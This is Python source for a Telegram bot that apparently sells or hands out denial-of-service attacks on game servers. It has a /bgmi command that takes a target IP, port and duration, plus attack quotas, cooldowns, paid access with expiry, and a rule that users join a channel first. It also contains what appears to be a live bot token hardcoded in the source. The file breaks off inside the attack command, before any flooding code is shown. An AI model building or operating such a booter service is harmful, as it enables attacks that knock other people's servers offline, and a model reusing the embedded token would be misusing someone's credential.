import os
import telebot
import logging
import asyncio
import threading
import re
from datetime import datetime, timedelta, timezone
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Telegram bot token and channel ID
TOKEN = '7475040161:AAEVgSo48PvO_gsw5jOv4_7p00Iz3EDEUIU'  # Replace with your actual bot token
ADMIN_IDS = [7479349647]  # Added new admin ID
CHANNEL_ID = '-1002439558968'  # Replace with your specific channel or group ID
# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Dictionary to track user attack counts, cooldowns, photo feedbacks, and bans
user_attacks = {}
user_cooldowns = {}
user_photos = {}  # Tracks whether a user has sent a photo as feedback
user_bans = {}  # Tracks user ban status and ban expiry time
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=10))).replace(hour=0, minute=0, second=0, microsecond=0)

# Cooldown duration (in seconds)
COOLDOWN_DURATION = 120  # 5 minutes
BAN_DURATION = timedelta(minutes=1)  
DAILY_ATTACK_LIMIT = 15  # Daily attack limit per user

# List of user IDs exempted from cooldown, limits, and photo requirements
EXEMPTED_USERS = [6768273586, 7479349647]
# 🔥 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗨𝗦𝗘𝗥𝗦 & 𝗘𝗫𝗣𝗜𝗥𝗬 𝗧𝗥𝗔𝗖𝗞𝗜𝗡𝗚
AUTHORIZED_USERS = []
user_expiry = {}

# ⏳ 𝗙𝗨𝗡𝗖𝗧𝗜𝗢𝗡 𝗧𝗢 𝗥𝗘𝗠𝗢𝗩𝗘 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 𝗨𝗦𝗘𝗥𝗦
def remove_expired_users():
    while True:
        now = datetime.now()
        expired_users = [user for user, expiry in user_expiry.items() if now >= expiry]
        
        for user in expired_users:
            if user in AUTHORIZED_USERS:
                AUTHORIZED_USERS.remove(user)
                del user_expiry[user]
                print(f"❌ 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 𝘂𝘀𝗲𝗿: `{user}`")
        
        time.sleep(10)  # 🔄 𝗖𝗵𝗲𝗰𝗸 𝗲𝘃𝗲𝗿𝘆 𝟭𝟬 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

# 🚀 𝗦𝗧𝗔𝗥𝗧 𝗘𝗫𝗣𝗜𝗥𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗧𝗛𝗥𝗘𝗔𝗗
expiry_thread = threading.Thread(target=remove_expired_users, daemon=True)
expiry_thread.start()

MAX_ACTIVE_ATTACKS = 1  # Only 1 attack at a time
active_attack = None  # Stores (IP, Port, Duration)
attack_end_time = None  # Stores when attack ends

def reset_daily_counts():
    """Reset the daily attack counts and other data at 12 AM IST."""
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=10)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)


# Function to validate IP address
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# Function to validate port number
def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

# Function to validate duration
def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "User"

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "User"

    # Check if user is authorized and get expiry time
    if user_id in AUTHORIZED_USERS:
        expiry_time = user_expiry.get(user_id, None)
        if expiry_time:
            now = datetime.now()
            remaining_time = expiry_time - now
            days = remaining_time.days
            hours, remainder = divmod(remaining_time.seconds, 3600)
            minutes, _ = divmod(remainder, 60)
            expiry_text = f"`{days}d {hours}h {minutes}m`"
        else:
            expiry_text = "`No expiry set`"

        status = f"✅ **ACTIVE**\n⏳ **Expires in:** {expiry_text}"
    else:
        status = "❌ **NOT ACTIVE**"

    # Fetch user profile pictures (DP)
    try:
        photos = bot.get_user_profile_photos(user_id)
        has_photo = photos.total_count > 0
    except Exception as e:
        print(f"❌ Error fetching profile photos: {e}")  # Debugging
        has_photo = False

    # Stylish welcome message
    welcome_text = (
        f"👋🏻 *𝗪𝗘𝗟𝗖𝗢𝗠𝗘, {user_name}!* 🔥\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🤖 *𝗧𝗛𝗜𝗦 𝗜𝗦 𝗧𝗙_𝗙𝗟𝗔𝗦𝗛 𝗕𝗢𝗧!*\n"
        f"🆔 **User ID:** `{user_id}`\n"
        f"🛡️ **𝗦𝗧𝗔𝗧𝗨𝗦:** {status}\n\n"
        "📢 *𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📌 *𝗧𝗿𝘆 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱:*\n"
        "`/bgmi` - 🚀 *Start an attack!*\n\n"
        "👑 *𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬:* [@TF_FLASH92](https://t.me/TF_FLASH92) 💀"
    )

    # Create button URL
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("[➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖]", url="https://t.me/FLASHxDILDOS1")
    )
    keyboard.add(
        InlineKeyboardButton("👑 𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬 👑", url="https://t.me/TF_FLASH92")
    )

    # ✅ If user has a profile photo, send it with the button
    if has_photo:
        try:
            photo_file_id = photos.photos[0][0].file_id  # Get latest profile picture
            bot.send_photo(
                message.chat.id, 
                photo_file_id, 
                caption=welcome_text, 
                parse_mode="Markdown",
                reply_markup=keyboard
            )
        except Exception as e:
            print(f"❌ Error sending photo: {e}")  # Debugging
            bot.send_message(
                message.chat.id, 
                welcome_text, 
                parse_mode="Markdown",
                disable_web_page_preview=True,
                reply_markup=keyboard
            )
    else:
        # If no profile picture, send just the text with the button
        bot.send_message(
            message.chat.id, 
            welcome_text, 
            parse_mode="Markdown",
            disable_web_page_preview=True,
            reply_markup=keyboard
        )

@bot.message_handler(commands=['help'])
def show_help(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.send_message(message.chat.id, " *‼️𝙏𝙁_𝙁𝙇𝘼𝙎𝙃 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗‼️* \n\n🔒 *Only admins can use this command!*", parse_mode="Markdown")
        return
    
    help_text = (
        "📌 *𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦* 📌\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔹 `/start` - Welcome Message & Info\n"
        "🔹 `/help` - Show this help menu\n"
        "🔹 `/status` - Check user attack limits & cooldown\n"
        "🔹 `/check` - Check if an attack is running\n"
        "🔹 `/bgmi <ip> <port> <time>` - Start an attack\n"
        "🔹 `/reset_TF` - Reset attack limits\n"
        "🔹 `/add <user_id> <time>` - Add an authorized user\n"
        "🔹 `/remove <user_id>` - Remove an authorized user\n"
        "🔹 `/users` - List authorized users\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🚀 *Admin Access Only!* 🔥"
    )

    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("[➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖]", url="https://t.me/FLASHxDILDOS1"))
    keyboard.add(InlineKeyboardButton("👑 𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬 👑", url="https://t.me/TF_FLASH92"))
    
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown", disable_web_page_preview=True, reply_markup=keyboard)

@bot.message_handler(commands=['status'])
def check_status(message):
    user_id = message.from_user.id
    remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
    cooldown_end = user_cooldowns.get(user_id)

    # Calculate cooldown time in MM:SS format
    if cooldown_end:
        remaining_seconds = max(0, (cooldown_end - datetime.now()).seconds)
        minutes, seconds = divmod(remaining_seconds, 60)
        cooldown_time = f"{minutes} min {seconds} sec"
    else:
        cooldown_time = "No cooldown ⏳"

    response = (
        "🛡️ **『 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦??𝗔𝗧𝗨𝗦 』** 🛡️\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **User:** `{message.from_user.first_name}`\n"
        f"🆔 **User ID:** `{user_id}`\n"
        f"🎯 **Remaining Attacks:** `{remaining_attacks} ⚔️`\n"
        f"⏳ **Cooldown Time:** `{cooldown_time}` 🕒\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🚀 **𝙆𝙀𝙀𝙋 𝙋𝙐𝙎𝙃𝙄𝙉𝙂 & 𝙎𝙏𝘼𝙔 𝙄𝙉 𝙏𝙃𝙀 𝙂𝘼𝙈𝙀!** 🔥"
    )

    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['reset_TF'])
def reset_attack_limit(message):
    owner_id = 7479349647  # Replace with the actual owner ID

    if message.from_user.id != owner_id:
        response = (
            "🚫❌ **𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗!** ❌🚫\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "🔒 **𝗬𝗼𝘂 𝗱𝗼 𝗻𝗼𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!** 🔒\n\n"
            "👑 **𝗢𝗻𝗹𝘆 𝘁𝗵𝗲 𝗕𝗢𝗦𝗦 𝗰𝗮𝗻 𝗲𝘅𝗲𝗰𝘂𝘁𝗲 𝘁𝗵𝗶𝘀!** 💀"
        )
        bot.reply_to(message, response, parse_mode="Markdown")
        return
    
    # Reset the attack count for all users
    user_attacks.clear()

    response = (
        "🔄🔥 **『 𝗦𝗬𝗦𝗧𝗘𝗠 𝗥𝗘𝗦𝗘𝗧 𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗘𝗗! 』** 🔥🔄\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "⚙️ **𝗔𝗟𝗟 𝗗𝗔𝗜𝗟𝗬 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗜𝗠𝗜𝗧𝗦 𝗛𝗔𝗩𝗘 𝗕𝗘𝗘𝗡 𝗥𝗘𝗦𝗘𝗧!** ⚙️\n\n"
        "🚀 **𝗨𝘀𝗲𝗿𝘀 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘀𝘁𝗮𝗿𝘁 𝗻𝗲𝘄 𝗮𝘁𝘁𝗮𝗰𝗸𝘀!** 🚀\n"
        "💀 **𝗣𝗿𝗲𝗽𝗮𝗿𝗲 𝗳𝗼𝗿 𝗗𝗢𝗠𝗜𝗡𝗔𝗧𝗜𝗢𝗡!** 💀\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔗 **𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬:** [𝙏F_𝙁𝙇𝘼𝙎𝙃𝟵𝟮](https://t.me/TF_FLASH92) ⚡"
    )

    bot.reply_to(message, response, parse_mode="Markdown", disable_web_page_preview=True)


# Handler for photos sent by users (feedback received)
# Define the feedback channel ID
FEEDBACK_CHANNEL_ID = "-1002333274496"  # Replace with your actual feedback channel ID

# Store the last feedback photo ID for each user to detect duplicates
last_feedback_photo = {}

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    photo_id = message.photo[-1].file_id  # Get the latest photo ID

    # Check if the user has sent the same feedback before & give a warning
    if last_feedback_photo.get(user_id) == photo_id:
        response = (
            "⚠️🚨 *『 𝗪𝗔𝗥𝗡𝗜𝗡𝗚: SAME 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞! 』* 🚨⚠️\n\n"
            "🛑 *𝖸𝖮𝖴 𝖧𝖠𝖵𝖤 𝖲𝖤𝖭𝖳 𝖳𝖧𝖨𝖲 𝖥𝖤𝖤𝖣𝖡𝖠𝖢𝖪 𝘽𝙀𝙁𝙊𝙍𝙀!* 🛑\n"
            "📩 *𝙋𝙇𝙀𝘼𝙎𝙀 𝘼𝙑𝙊𝙄𝘿 𝙍𝙀𝙎𝙀𝙉𝘿𝙄𝙉𝙂 𝙏𝙃𝙀 𝙎𝘼𝙈𝙀 𝙋𝙃𝙊𝙏𝙊.*\n\n"
            "✅ *𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙒𝙄𝙇𝙇 𝙎𝙏𝙄𝙇𝙇 𝘽𝙀 𝙎𝙀𝙉𝙏!*"
        )
        response = bot.reply_to(message, response)

    # ✅ Store the new feedback ID (this ensures future warnings)
    last_feedback_photo[user_id] = photo_id
    user_photos[user_id] = True  # Mark feedback as given

    # ✅ Stylish Confirmation Message for User
    response = (
        "✨『 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳𝑳𝒀 𝑹𝑬𝑪𝑬𝑰𝑽𝑬𝑫! 』✨\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🏆\n"
        "📩 𝙏𝙃𝘼𝙉𝙆 𝙔𝙊𝙐 𝙁𝙊𝙍 𝙎𝙃𝘼𝙍𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!🎉\n"
        "━━━━━━━━━━━━━━━━━━━"
    )
    response = bot.reply_to(message, response)

    # 🔥 Forward the photo to all admins
    for admin_id in ADMIN_IDS:
        bot.forward_message(admin_id, message.chat.id, message.message_id)
        admin_response = (
            "🚀🔥 *『 𝑵𝑬𝑾 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑹𝑬𝑪𝑬𝑰𝑽𝑬𝑫! 』* 🔥🚀\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🛡️\n"
            f"🆔 *𝙐𝙨𝙚𝙧 𝙄𝘿:* `{user_id}`\n"
            "📸 *𝙏𝙃𝘼𝙉𝙆 𝙔𝙊𝙐 𝙁𝙊𝙍 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!!* ⬇️\n"
            "━━━━━━━━━━━━━━━━━━━"
        )
        bot.send_message(admin_id, admin_response)

    # 🎯 Forward the photo to the feedback channel
    bot.forward_message(FEEDBACK_CHANNEL_ID, message.chat.id, message.message_id)
    channel_response = (
        "🌟🎖️ *『 𝑵𝑬𝑾 𝑷𝑼𝑩𝑳𝑰𝑪 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲! 』* 🎖️🌟\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🏆\n"
        f"🆔 *𝙐𝙨𝙚𝙧 𝙄𝘿:* `{user_id}`\n"
        "📸 *𝙐𝙎𝙀𝙍 𝙃𝘼𝙎 𝙎𝙃𝘼𝙍𝙀𝘿 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆.!* 🖼️\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "📢 *𝙆𝙀𝙀𝙋 𝙎𝙐𝙋𝙋𝙊𝙍𝙏𝙄𝙉𝙂 & 𝙎𝙃𝘼𝙍𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!* 💖"
    )
    bot.send_message(FEEDBACK_CHANNEL_ID, channel_response)


@bot.message_handler(commands=['check'])
def check_attack_status(message):
    global active_attack, attack_end_time

    if not active_attack:
        bot.send_message(message.chat.id, "‼️ **NO ATTACK RUNNING RIGHT NOW** ‼️", parse_mode="Markdown")
        return

    remaining_time = max(0, int((attack_end_time - datetime.now()).total_seconds()))
    target_ip, target_port, duration = active_attack

    response = (
        "🚀 **『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎 』** 🚀\n\n"
        f"🎯 **Target:** `{target_ip}:{target_port}`\n"
        f"⏳ **Time Left:** `{remaining_time} seconds`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ **𝘼𝙩𝙩𝙖𝙘𝙠 𝙞𝙣 𝙥𝙧𝙤𝙜𝙧𝙚𝙨𝙨... 𝙀𝙣𝙟𝙤𝙮 𝙏𝙃𝙀 𝙎𝙏𝙍𝙄𝙆𝙀!** 💀"
    )

    bot.send_message(message.chat.id, response, parse_mode="Markdown")
@bot.message_handler(commands=['add'])
def add_user(message):
    owner_id = 7479349647  # 👑 𝗥𝗘𝗣𝗟𝗔𝗖𝗘 𝗪𝗜𝗧𝗛 𝗔𝗖𝗧𝗨𝗔𝗟 𝗢𝗪𝗡𝗘𝗥 𝗜𝗗

    if message.from_user.id != owner_id:
        bot.send_message(message.chat.id, "🚫❌ **𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗!** ❌🚫\n\n👑 **𝗢𝗻𝗹𝘆 𝘁𝗵𝗲 𝗢𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝗮𝗱𝗱 𝘂𝘀𝗲𝗿𝘀!**", parse_mode="Markdown")
        return

    try:
        args = message.text.split()
        if len(args) < 3:
            bot.send_message(message.chat.id, "⚠️ **𝗨𝗦𝗔𝗚𝗘:** `/add <user_id> <time>`\n\n📌 **𝗘𝗫𝗔𝗠𝗣𝗟𝗘:**\n`/add 123456789 2h 30m 1d` *(2 hours, 30 minutes, 1 day)*", parse_mode="Markdown")
            return

        user_id = int(args[1])
        total_expiry = timedelta()

        for time_arg in args[2:]:
            match = re.match(r"(\d+)([hmd])", time_arg)
            if match:
                value, unit = int(match.group(1)), match.group(2)
                if unit == "h":
                    total_expiry += timedelta(hours=value)
                elif unit == "m":
                    total_expiry += timedelta(minutes=value)
                elif unit == "d":
                    total_expiry += timedelta(days=value)
            else:
                bot.send_message(message.chat.id, "❌ **𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗧𝗜𝗠𝗘 𝗙𝗢𝗥𝗠𝗔𝗧!**\n\n✅ **𝗨𝘀𝗲:** `h` **𝗳𝗼𝗿 𝗵𝗼𝘂𝗿𝘀,** `m` **𝗳𝗼𝗿 𝗺𝗶𝗻𝘂𝘁𝗲𝘀, 𝗮𝗻𝗱** `d` **𝗳𝗼𝗿 𝗱𝗮𝘆𝘀.**\n📌 **𝗘𝘅𝗮𝗺𝗽𝗹𝗲:** `/add 123456789 2h 30m 1d`", parse_mode="Markdown")
                return

        if user_id in AUTHORIZED_USERS:
            bot.send_message(message.chat.id, f"✅ **𝗨𝘀𝗲𝗿 `{user_id}` 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱!**", parse_mode="Markdown")
        else:
            AUTHORIZED_USERS.append(user_id)
            user_expiry[user_id] = datetime.now() + total_expiry
            expiry_time = user_expiry[user_id].strftime('`%Y-%m-%d %H:%M:%S`')
            bot.send_message(message.chat.id, f"🎉 **𝗨𝘀𝗲𝗿 `{user_id}` 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗮𝗱𝗱𝗲𝗱!**\n\n🕒 **𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻:** {expiry_time}", parse_mode="Markdown")
    
    except ValueError:
        bot.send_message(message.chat.id, "❌ **𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗜𝗡𝗣𝗨𝗧!**\n\n📌 **𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝘂𝘀𝗲𝗿 𝗜𝗗 𝗮𝗻𝗱 𝘁𝗶𝗺𝗲 𝗳𝗼𝗿𝗺𝗮𝘁.**", parse_mode="Markdown")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    owner_id = 7479349647  # Replace with your own ID

    if message.from_user.id != owner_id:
        bot.send_message(message.chat.id, 
                         "🚫❌ **𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗!** ❌🚫\n\n"
                         "👑 **𝗢𝗻𝗹𝘆 𝘁𝗵𝗲 𝗢𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝗿𝗲𝗺𝗼𝘃𝗲 𝘂𝘀𝗲𝗿𝘀!**",
                         parse_mode="Markdown")
        return

    try:
        args = message.text.split()
        if len(args) != 2:
            bot.send_message(message.chat.id, 
                             "⚠️ **𝗨𝘀𝗮𝗴𝗲:** `/remove <user_id>`",
                             parse_mode="Markdown")
            return

        user_id = int(args[1])

        if user_id in AUTHORIZED_USERS:
            AUTHORIZED_USERS.remove(user_id)
            bot.send_message(message.chat.id, 
                             f"✅ **𝗨𝘀𝗲𝗿 `{user_id}` 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!**",
                             parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, 
                             f"⚠️ **𝗨𝘀𝗲𝗿 `{user_id}` 𝗶𝘀 𝗻𝗼𝘁 𝗶𝗻 𝘁𝗵𝗲 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗹𝗶𝘀𝘁.**",
                             parse_mode="Markdown")

    except ValueError:
        bot.send_message(message.chat.id, 
                         "❌ **𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗨𝘀𝗲𝗿 𝗜𝗗.** 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿.",
                         parse_mode="Markdown")

@bot.message_handler(commands=['users'])
def list_users(message):
    if message.from_user.id != 7479349647:  # Replace with your own ID
        bot.send_message(message.chat.id, 
                         "🚫❌ **𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗!** ❌🚫\n\n"
                         "👑 **𝗢𝗻𝗹𝘆 𝘁𝗵𝗲 𝗢𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝘃𝗶𝗲𝘄 𝘁𝗵𝗲 𝘂𝘀𝗲𝗿 𝗹𝗶𝘀𝘁!**",
                         parse_mode="Markdown")
        return

    if not AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 **𝗡𝗼 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱!**", parse_mode="Markdown")
    else:
        user_list = []
        now = datetime.now()
        for user_id in AUTHORIZED_USERS:
            expiry_time = user_expiry.get(user_id, None)
            if expiry_time:
                remaining_time = expiry_time - now
                days = remaining_time.days
                hours, remainder = divmod(remaining_time.seconds, 3600)
                minutes, _ = divmod(remainder, 60)
                expiry_text = f"📅 `{days}d {hours}h {minutes}m`"
            else:
                expiry_text = "⏳ `No expiry set`"

            user_list.append(f"🔹 `{user_id}` - {expiry_text}")

        bot.send_message(message.chat.id, 
                         f"👥 **𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗨𝗦𝗘𝗥𝗦 & 𝗘𝗫𝗣𝗜𝗥𝗬 𝗧𝗜𝗠𝗘:**\n━━━━━━━━━━━━━━━━━━━━━\n" + 
                         "\n".join(user_list),
                         parse_mode="Markdown")

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global active_attack, attack_end_time, user_cooldowns, user_photos, user_bans
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"
    required_channel = FEEDBACK_CHANNEL_ID  # Replace with your actual channel ID


    # Check if the user is a member of the required channel
    try:
        user_status = bot.get_chat_member(required_channel, user_id).status
        if user_status not in ["member", "administrator", "creator"]:
            bot.send_message(
                message.chat.id,
                " *‼️𝙏𝙁_𝙁𝙇𝘼𝙎𝙃 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗‼️* \n\n"
                "🖤*BHAI PHLE JOIN KAR LE USE KAR NE KE LIYE*🖤\n\n"
                "📢 *LET'S GO AND JOIN CHANNEL*\n"
                f" [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/FLASHxDILDOS1)\n\n"
                " *‼️𝗔𝗳𝘁𝗲𝗿 𝗷𝗼𝗶𝗻𝗶𝗻𝗴, 𝘁𝗿𝘆 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 /bgmi 𝗮𝗴𝗮𝗶𝗻‼️*",
                parse_mode="Markdown",
                disable_web_page_preview=True
            )
            return
    except Exception as e:
        bot.send_message(
            message.chat.id,
            f"⚠️ *Error checking channel membership: {e}*"
        )
        return

    # Add your existing attack execution logic here...
    # Allow users in the channel OR authorized users in personal chat
    chat_id = message.chat.id

    if chat_id != CHANNEL_ID and message.from_user.id not in AUTHORIZED_USERS:
        bot.send_message(
            chat_id,
            "⚠️⚠️ **𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗!** ⚠️⚠️\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "🔒 **𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!** 🔒\n\n"
            "📌 **𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗶𝗻 𝘁𝗵𝗲 𝗼𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗼𝗿 𝗮𝗱𝗱𝗲𝗱 𝗯𝘆 𝘁𝗵𝗲 𝗼𝘄𝗻𝗲𝗿.**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "🤖 **𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬:** [@TG_FLASH92](https://t.me/TG_FLASH92) 💀\n",
            parse_mode="Markdown",
            disable_web_page_preview=True
        )
        return

    # Reset counts daily
    reset_daily_counts()

    # Check if the user is banned
    if user_id in user_bans:
        ban_expiry = user_bans[user_id]
        if datetime.now() < ban_expiry:
            remaining_ban_time = (ban_expiry - datetime.now()).total_seconds()
            minutes, seconds = divmod(remaining_ban_time, 10)
            bot.send_message(
                message.chat.id,
                f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣𝙜 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️"
            )
            return
        else:
            del user_bans[user_id]  # Remove ban after expiry

    # Check if user is exempted from cooldowns, limits, and feedback requirements
    if user_id not in AUTHORIZED_USERS:
        # Check if user is in cooldown
        if user_id in user_cooldowns:
            cooldown_time = user_cooldowns[user_id]
            if datetime.now() < cooldown_time:
                remaining_time = (cooldown_time - datetime.now()).seconds
                bot.send_message(
                    message.chat.id,
